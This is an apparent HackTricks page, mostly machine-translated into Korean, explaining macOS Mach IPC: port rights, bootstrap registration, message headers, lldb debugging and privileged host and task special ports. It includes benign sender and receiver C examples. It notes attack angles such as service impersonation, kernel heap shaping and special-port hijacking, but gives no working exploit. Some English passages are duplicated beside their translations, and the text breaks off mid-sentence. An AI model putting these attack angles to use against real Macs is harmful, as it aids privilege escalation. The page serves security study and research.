# macOS IPC - Inter Process Communication

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Mach messaging via Ports

### Basic Information

Mach는 **작업**을 **자원을 공유하기 위한 가장 작은 단위**로 사용하며, 각 작업은 **여러 스레드**를 포함할 수 있습니다. 이러한 **작업과 스레드는 POSIX 프로세스 및 스레드에 1:1로 매핑됩니다**.

작업 간의 통신은 Mach Inter-Process Communication (IPC)을 통해 이루어지며, 단방향 통신 채널을 활용합니다. **메시지는 포트 간에 전송되며**, 이는 커널에 의해 관리되는 일종의 **메시지 큐** 역할을 합니다.

**포트**는 Mach IPC의 **기본** 요소입니다. 메시지를 **전송하고 수신하는 데** 사용될 수 있습니다.

각 프로세스는 **IPC 테이블**을 가지고 있으며, 여기에서 **프로세스의 mach 포트**를 찾을 수 있습니다. mach 포트의 이름은 실제로 숫자(커널 객체에 대한 포인터)입니다.

프로세스는 또한 **다른 작업**에 포트 이름과 일부 권한을 전송할 수 있으며, 커널은 이 항목을 **다른 작업의 IPC 테이블**에 나타나게 합니다.

### Port Rights

작업이 수행할 수 있는 작업을 정의하는 포트 권한은 이 통신의 핵심입니다. 가능한 **포트 권한**은 ([정의는 여기서](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **수신 권한**: 포트로 전송된 메시지를 수신할 수 있는 권한. Mach 포트는 MPSC(다중 생산자, 단일 소비자) 큐로, 시스템 전체에서 **각 포트에 대해 하나의 수신 권한만** 존재할 수 있습니다(파이프와는 달리, 여러 프로세스가 하나의 파이프의 읽기 끝에 대한 파일 설명자를 가질 수 있습니다).
* **수신 권한**을 가진 작업은 메시지를 수신하고 **전송 권한**을 생성할 수 있어 메시지를 보낼 수 있습니다. 원래는 **자신의 작업만이 자신의 포트에 대한 수신 권한을 가집니다**.
* 수신 권한의 소유자가 **죽거나** 이를 종료하면, **전송 권한은 쓸모없게 됩니다(죽은 이름)**.
* **전송 권한**: 포트로 메시지를 전송할 수 있는 권한.
* 전송 권한은 **복제**될 수 있어, 전송 권한을 가진 작업이 권한을 복제하고 **세 번째 작업에 부여할 수 있습니다**.
* **포트 권한**은 Mac 메시지를 통해 **전달될 수 있습니다**.
* **일회성 전송 권한**: 포트에 한 메시지를 전송하고 사라지는 권한.
* 이 권한은 **복제될 수 없지만**, **이동될 수 있습니다**.
* **포트 집합 권한**: 단일 포트가 아닌 _포트 집합_을 나타냅니다. 포트 집합에서 메시지를 큐에서 제거하면 포함된 포트 중 하나에서 메시지가 제거됩니다. 포트 집합은 Unix의 `select`/`poll`/`epoll`/`kqueue`와 유사하게 여러 포트에서 동시에 수신하는 데 사용할 수 있습니다.
* **죽은 이름**: 실제 포트 권한이 아니라 단순한 자리 표시자입니다. 포트가 파괴되면, 해당 포트에 대한 모든 기존 포트 권한은 죽은 이름으로 변환됩니다.

**작업은 다른 작업에 SEND 권한을 전송할 수 있어**, 메시지를 다시 보낼 수 있게 합니다. **SEND 권한은 복제될 수 있어, 작업이 이를 복제하고 세 번째 작업에 권한을 부여할 수 있습니다**. 이는 **부트스트랩 서버**라는 중개 프로세스와 결합되어 작업 간의 효과적인 통신을 가능하게 합니다.

### File Ports

파일 포트는 Mac 포트에서 파일 설명자를 캡슐화할 수 있게 합니다( Mach 포트 권한 사용). 주어진 FD에서 `fileport_makeport`를 사용하여 `fileport`를 생성하고, 파일포트에서 FD를 생성하려면 `fileport_makefd`를 사용합니다.

### Establishing a communication

앞서 언급했듯이, Mach 메시지를 사용하여 권한을 전송할 수 있지만, **Mach 메시지를 전송할 권한이 없으면 권한을 전송할 수 없습니다**. 그렇다면 첫 번째 통신은 어떻게 설정될까요?

이를 위해 **부트스트랩 서버**(**launchd** in mac)가 관련됩니다. **모든 사용자가 부트스트랩 서버에 SEND 권한을 얻을 수 있으므로**, 다른 프로세스에 메시지를 전송할 권한을 요청할 수 있습니다:

1. 작업 **A**가 **새 포트**를 생성하고, 그에 대한 **수신 권한**을 얻습니다.
2. 작업 **A**는 수신 권한의 소유자로서 **포트에 대한 전송 권한을 생성**합니다.
3. 작업 **A**는 **부트스트랩 서버**와 **연결**을 설정하고, **처음 생성한 포트에 대한 전송 권한을** 서버에 **전송**합니다.
* 누구나 부트스트랩 서버에 SEND 권한을 얻을 수 있다는 점을 기억하세요.
4. 작업 A는 부트스트랩 서버에 `bootstrap_register` 메시지를 보내 **주어진 포트를 `com.apple.taska`와 같은 이름에 연결**합니다.
5. 작업 **B**는 **부트스트랩 서버**와 상호작용하여 서비스 이름에 대한 부트스트랩 **조회**를 실행합니다(`bootstrap_lookup`). 부트스트랩 서버가 응답할 수 있도록, 작업 B는 조회 메시지 내에서 **이전에 생성한 포트에 대한 SEND 권한**을 전송합니다. 조회가 성공하면, **서버는 작업 A로부터 받은 SEND 권한을 복제하여 작업 B에 전송**합니다.
* 누구나 부트스트랩 서버에 SEND 권한을 얻을 수 있다는 점을 기억하세요.
6. 이 SEND 권한으로 **작업 B**는 **작업 A**에 **메시지를 전송**할 수 있습니다.
7. 양방향 통신을 위해 일반적으로 작업 **B**는 **수신** 권한과 **전송** 권한을 가진 새 포트를 생성하고, **SEND 권한을 작업 A에 부여**하여 작업 B에 메시지를 보낼 수 있게 합니다(양방향 통신).

부트스트랩 서버는 작업이 주장하는 서비스 이름을 **인증할 수 없습니다**. 이는 **작업**이 잠재적으로 **모든 시스템 작업을 가장할 수 있음을 의미합니다**, 예를 들어 잘못된 **인증 서비스 이름을 주장하고 모든 요청을 승인하는 것**입니다.

그런 다음 Apple은 **시스템 제공 서비스의 이름**을 보안 구성 파일에 저장하며, 이 파일은 **SIP 보호** 디렉토리에 위치합니다: `/System/Library/LaunchDaemons` 및 `/System/Library/LaunchAgents`. 각 서비스 이름과 함께 **연관된 바이너리도 저장됩니다**. 부트스트랩 서버는 이러한 서비스 이름 각각에 대해 **수신 권한을 생성하고 유지**합니다.

이러한 미리 정의된 서비스에 대해 **조회 프로세스는 약간 다릅니다**. 서비스 이름이 조회될 때, launchd는 서비스를 동적으로 시작합니다. 새로운 워크플로우는 다음과 같습니다:

* 작업 **B**가 서비스 이름에 대한 부트스트랩 **조회**를 시작합니다.
* **launchd**는 작업이 실행 중인지 확인하고, 실행 중이 아니면 **시작**합니다.
* 작업 **A**(서비스)는 **부트스트랩 체크인**(`bootstrap_check_in()`)을 수행합니다. 여기서 **부트스트랩** 서버는 SEND 권한을 생성하고 이를 유지하며, **수신 권한을 작업 A에 전송**합니다.
* launchd는 **SEND 권한을 복제하여 작업 B에 전송**합니다.
* 작업 **B**는 **수신** 권한과 **전송** 권한을 가진 새 포트를 생성하고, **SEND 권한을 작업 A**(svc)에 부여하여 작업 B에 메시지를 보낼 수 있게 합니다(양방향 통신).

그러나 이 프로세스는 미리 정의된 시스템 작업에만 적용됩니다. 비시스템 작업은 여전히 원래 설명된 대로 작동하며, 이는 잠재적으로 가장할 수 있는 가능성을 허용할 수 있습니다.

{% hint style="danger" %}
따라서 launchd는 절대 충돌해서는 안 되며, 그렇지 않으면 전체 시스템이 충돌할 것입니다.
{% endhint %}

### A Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

`mach_msg` 함수는 본질적으로 시스템 호출로, Mach 메시지를 전송하고 수신하는 데 사용됩니다. 이 함수는 전송할 메시지를 첫 번째 인수로 요구합니다. 이 메시지는 `mach_msg_header_t` 구조체로 시작해야 하며, 그 뒤에 실제 메시지 내용이 이어져야 합니다. 구조체는 다음과 같이 정의됩니다:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Processes possessing a _**receive right**_ can receive messages on a Mach port. Conversely, the **senders** are granted a _**send**_ or a _**send-once right**_. The send-once right is exclusively for sending a single message, after which it becomes invalid.

The initial field **`msgh_bits`** is a bitmap:

* First bit (most significative) is used to indicate that a message is complex (more on this below)
* The 3rd and 4th are used by the kernel
* The **5 least significant bits of the 2nd byte** from can be used for **voucher**: another type of port to send key/value combinations.
* The **5 least significant bits of the 3rd byte** from can be used for **local port**
* The **5 least significant bits of the 4th byte** from can be used for **remote port**

The types that can be specified in the voucher, local and remote ports are (from [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)): 

프로세스는 _**수신 권한**_을 가지고 있으면 Mach 포트에서 메시지를 수신할 수 있습니다. 반대로, **발신자**는 _**전송**_ 또는 _**일회성 전송 권한**_을 부여받습니다. 일회성 전송 권한은 단일 메시지를 전송하는 데만 사용되며, 그 후에는 무효가 됩니다.

초기 필드 **`msgh_bits`**는 비트맵입니다:

* 첫 번째 비트(가장 중요한 비트)는 메시지가 복잡하다는 것을 나타내는 데 사용됩니다(자세한 내용은 아래 참조).
* 3번째 및 4번째 비트는 커널에서 사용됩니다.
* **두 번째 바이트의 5개 최소 중요 비트**는 **바우처**에 사용할 수 있습니다: 키/값 조합을 전송하기 위한 또 다른 유형의 포트입니다.
* **세 번째 바이트의 5개 최소 중요 비트**는 **로컬 포트**에 사용할 수 있습니다.
* **네 번째 바이트의 5개 최소 중요 비트**는 **원격 포트**에 사용할 수 있습니다.

바우처, 로컬 및 원격 포트에서 지정할 수 있는 유형은 다음과 같습니다(출처: [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
예를 들어, `MACH_MSG_TYPE_MAKE_SEND_ONCE`는 이 포트에 대해 **전송-한번** **권한**이 파생되고 전송되어야 함을 **지시**하는 데 사용될 수 있습니다. 수신자가 응답할 수 없도록 `MACH_PORT_NULL`로 지정할 수도 있습니다.

쉬운 **양방향 통신**을 달성하기 위해 프로세스는 메시지의 수신자가 이 메시지에 **응답**을 보낼 수 있는 _응답 포트_ (**`msgh_local_port`**)라고 불리는 mach **메시지 헤더**에 **mach 포트**를 지정할 수 있습니다.

{% hint style="success" %}
이러한 종류의 양방향 통신은 응답을 기대하는 XPC 메시지에서 사용된다는 점에 유의하십시오 (`xpc_connection_send_message_with_reply` 및 `xpc_connection_send_message_with_reply_sync`). 그러나 **일반적으로 양방향 통신을 생성하기 위해** 이전에 설명한 대로 **다른 포트가 생성됩니다**.
{% endhint %}

메시지 헤더의 다른 필드는 다음과 같습니다:

* `msgh_size`: 전체 패킷의 크기.
* `msgh_remote_port`: 이 메시지가 전송되는 포트.
* `msgh_voucher_port`: [mach 바우처](https://robert.sesek.com/2023/6/mach\_vouchers.html).
* `msgh_id`: 수신자가 해석하는 이 메시지의 ID.

{% hint style="danger" %}
**mach 메시지는 `mach port`를 통해 전송된다는 점에 유의하십시오**, 이는 **단일 수신자**, **다수의 발신자** 통신 채널로 mach 커널에 내장되어 있습니다. **여러 프로세스**가 mach 포트에 **메시지를 보낼 수 있지만**, 언제든지 **단일 프로세스만 읽을 수 있습니다**.
{% endhint %}

메시지는 **`mach_msg_header_t`** 헤더로 형성된 다음 **본문**과 **트레일러**(있는 경우)로 이어지며, 이에 대한 응답 권한을 부여할 수 있습니다. 이러한 경우, 커널은 단순히 한 작업에서 다른 작업으로 메시지를 전달하면 됩니다.

**트레일러**는 **커널에 의해 메시지에 추가된 정보**(사용자가 설정할 수 없음)로, `MACH_RCV_TRAILER_<trailer_opt>` 플래그로 메시지 수신 시 요청할 수 있습니다(요청할 수 있는 다양한 정보가 있습니다).

#### 복잡한 메시지

그러나 추가 포트 권한을 전달하거나 메모리를 공유하는 것과 같은 더 **복잡한** 메시지가 있으며, 이 경우 커널은 이러한 객체를 수신자에게 전송해야 합니다. 이 경우 헤더 `msgh_bits`의 가장 중요한 비트가 설정됩니다.

전달할 수 있는 가능한 설명자는 [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)에서 정의됩니다:
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
In 32비트에서는 모든 설명자가 12B이고 설명자 유형은 11번째에 있습니다. 64비트에서는 크기가 다양합니다.

{% hint style="danger" %}
커널은 한 작업에서 다른 작업으로 설명자를 복사하지만 먼저 **커널 메모리에 복사본을 생성**합니다. "Feng Shui"로 알려진 이 기술은 여러 익스플로잇에서 남용되어 **커널이 자신의 메모리에 데이터를 복사**하게 하여 프로세스가 자신에게 설명자를 전송하게 만듭니다. 그런 다음 프로세스는 메시지를 수신할 수 있습니다(커널이 이를 해제합니다).

또한 **취약한 프로세스에 포트 권한을 전송**하는 것도 가능하며, 포트 권한은 프로세스에 나타납니다(처리하지 않더라도).
{% endhint %}

### Mac Ports APIs

포트는 작업 네임스페이스와 연결되어 있으므로 포트를 생성하거나 검색하려면 작업 네임스페이스도 쿼리됩니다(자세한 내용은 `mach/mach_port.h` 참조):

* **`mach_port_allocate` | `mach_port_construct`**: **포트 생성**.
* `mach_port_allocate`는 **포트 집합**도 생성할 수 있습니다: 포트 그룹에 대한 수신 권한. 메시지가 수신될 때마다 메시지가 수신된 포트를 표시합니다.
* `mach_port_allocate_name`: 포트의 이름을 변경합니다(기본값은 32비트 정수).
* `mach_port_names`: 대상에서 포트 이름을 가져옵니다.
* `mach_port_type`: 이름에 대한 작업의 권한을 가져옵니다.
* `mach_port_rename`: 포트 이름을 변경합니다(FD의 dup2와 유사).
* `mach_port_allocate`: 새로운 RECEIVE, PORT_SET 또는 DEAD_NAME을 할당합니다.
* `mach_port_insert_right`: RECEIVE 권한이 있는 포트에 새로운 권한을 생성합니다.
* `mach_port_...`
* **`mach_msg`** | **`mach_msg_overwrite`**: **mach 메시지를 전송하고 수신하는 데 사용되는 함수**. 오버라이트 버전은 메시지 수신을 위한 다른 버퍼를 지정할 수 있습니다(다른 버전은 단순히 재사용합니다).

### Debug mach\_msg

**`mach_msg`** 및 **`mach_msg_overwrite`** 함수는 수신 메시지를 전송하는 데 사용되므로, 이들에 중단점을 설정하면 전송된 메시지와 수신된 메시지를 검사할 수 있습니다.

예를 들어, 디버깅할 수 있는 애플리케이션을 시작하면 **`libSystem.B`가 로드되어 이 함수를 사용할 것입니다**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>중단점 1: 위치 = libsystem_kernel.dylib`mach_msg, 주소 = 0x00000001803f6c20
<strong>(lldb) r
</strong>프로세스 71019 시작됨: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
프로세스 71019 중지됨
* 스레드 #1, 큐 = 'com.apple.main-thread', 중지 이유 = 중단점 1.1
프레임 #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 &#x3C;+0>:  pacibsp
0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
대상 0: (SandboxedShellApp) 중지됨.
<strong>(lldb) bt
</strong>* 스레드 #1, 큐 = 'com.apple.main-thread', 중지 이유 = 중단점 1.1
* 프레임 #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
프레임 #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
프레임 #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
프레임 #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
프레임 #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
프레임 #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
프레임 #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
프레임 #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
프레임 #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
프레임 #9: 0x0000000181a1d5c8 dyld`블록 내의 호출 함수 dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
</code></pre>

**`mach_msg`**의 인수를 얻으려면 레지스터를 확인하십시오. 이들은 인수입니다([mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)에서):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
레지스트리에서 값을 가져옵니다:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
메시지 헤더를 검사하여 첫 번째 인수를 확인하십시오:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
그 유형의 `mach_msg_bits_t`는 응답을 허용하는 데 매우 일반적입니다.



### 포트 나열
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
The **name**은 포트에 기본적으로 주어진 이름입니다 (첫 3 바이트에서 **증가**하는 방식을 확인하세요). **`ipc-object`**는 포트의 **난독화된** 고유 **식별자**입니다.\
오직 **`send`** 권한만 있는 포트가 그것의 **소유자**를 **식별**하는 방식을 주목하세요 (포트 이름 + pid).\
또한 **`+`**를 사용하여 **같은 포트에 연결된 다른 작업**을 나타내는 방식을 주목하세요.

[**procesxp**](https://www.newosxbook.com/tools/procexp.html)를 사용하여 **등록된 서비스 이름**도 확인할 수 있습니다 (SIP가 비활성화되어 있어야 `com.apple.system-task-port` 필요).
```
procesp 1 ports
```
You can install this tool in iOS downloading it from [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### 코드 예제

**보내는 사람**이 포트를 **할당**하고, 이름 `org.darlinghq.example`에 대한 **전송 권한**을 생성하여 **부트스트랩 서버**에 전송하는 방법에 주목하세요. 보내는 사람은 해당 이름의 **전송 권한**을 요청하고 이를 사용하여 **메시지를 전송**했습니다.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

## 특권 포트

특정 민감한 작업을 수행하거나 특정 민감한 데이터에 접근할 수 있도록 허용하는 몇 가지 특별한 포트가 있습니다. 이는 작업이 해당 포트에 대해 **SEND** 권한을 가질 경우 가능합니다. 이러한 포트는 공격자의 관점에서 매우 흥미롭습니다. 그 이유는 기능뿐만 아니라 **작업 간에 SEND 권한을 공유할 수 있기 때문**입니다.

### 호스트 특별 포트

이 포트는 숫자로 표현됩니다.

**SEND** 권한은 **`host_get_special_port`**를 호출하여 얻을 수 있으며, **RECEIVE** 권한은 **`host_set_special_port`**를 호출하여 얻을 수 있습니다. 그러나 두 호출 모두 **`host_priv`** 포트를 필요로 하며, 이는 오직 루트만 접근할 수 있습니다. 게다가 과거에는 루트가 **`host_set_special_port`**를 호출하여 임의의 포트를 탈취할 수 있었으며, 예를 들어 `HOST_KEXTD_PORT`를 탈취하여 코드 서명을 우회할 수 있었습니다(현재 SIP가 이를 방지합니다).

이들은 2개의 그룹으로 나뉩니다: **첫 7개의 포트는 커널에 의해 소유**되며, 1은 `HOST_PORT`, 2는 `HOST_PRIV_PORT`, 3은 `HOST_IO_MASTER_PORT`, 7은 `HOST_MAX_SPECIAL_KERNEL_PORT`입니다.\
**8번**부터 시작하는 포트는 **시스템 데몬에 의해 소유**되며, [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host\_special\_ports.h.auto.html)에서 선언된 것을 찾을 수 있습니다.

* **호스트 포트**: 프로세스가 이 포트에 대해 **SEND** 권한을 가지면 다음과 같은 시스템에 대한 **정보**를 얻을 수 있습니다:
* `host_processor_info`: 프로세서 정보 가져오기
* `host_info`: 호스트 정보 가져오기
* `host_virtual_physical_table_info`: 가상/물리 페이지 테이블 (MACH\_VMDEBUG 필요)
* `host_statistics`: 호스트 통계 가져오기
* `mach_memory_info`: 커널 메모리 레이아웃 가져오기
* **호스트 프라이빗 포트**: 이 포트에 대해 **SEND** 권한을 가진 프로세스는 부팅 데이터 표시 또는 커널 확장 로드 시도와 같은 **특권 작업**을 수행할 수 있습니다. **이 권한을 얻으려면 프로세스가 루트여야 합니다.**
* 또한 **`kext_request`** API를 호출하려면 **`com.apple.private.kext*`**와 같은 다른 권한이 필요하며, 이는 Apple 바이너리에게만 부여됩니다.
* 호출할 수 있는 다른 루틴은 다음과 같습니다:
* `host_get_boot_info`: `machine_boot_info()` 가져오기
* `host_priv_statistics`: 특권 통계 가져오기
* `vm_allocate_cpm`: 연속 물리 메모리 할당
* `host_processors`: 호스트 프로세서에 대한 전송 권한
* `mach_vm_wire`: 메모리를 상주 상태로 만들기
* **루트**가 이 권한에 접근할 수 있으므로, `host_set_[special/exception]_port[s]`를 호출하여 **호스트 특별 또는 예외 포트를 탈취**할 수 있습니다.

모든 호스트 특별 포트를 보려면 다음을 실행할 수 있습니다:
```bash
procexp all ports | grep "HSP"
```
### Task Special Ports

이들은 잘 알려진 서비스에 예약된 포트입니다. `task_[get/set]_special_port`를 호출하여 가져오거나 설정할 수 있습니다. 이들은 `task_special_ports.h`에서 찾을 수 있습니다:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
From [here](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html):

